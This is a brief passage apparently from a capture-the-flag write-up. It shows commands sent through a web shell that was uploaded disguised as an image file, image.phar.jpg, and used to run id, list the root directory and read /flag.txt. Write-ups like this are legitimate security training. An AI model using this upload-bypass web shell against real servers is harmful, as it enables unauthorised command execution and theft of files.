...
```
http://IP:PORT/contact/user_feedback_submissions/image.phar.jpg?cmd=id
```
...
```
http://IP:PORT/contact/user_feedback_submissions/image.phar.jpg?cmd=ls+/
```

And after that we locate the flag.txt so we simply cat it
```
http://IP:PORT/contact/user_feedback_submissions/image.phar.jpg?cmd=cat+/flag.txt
```
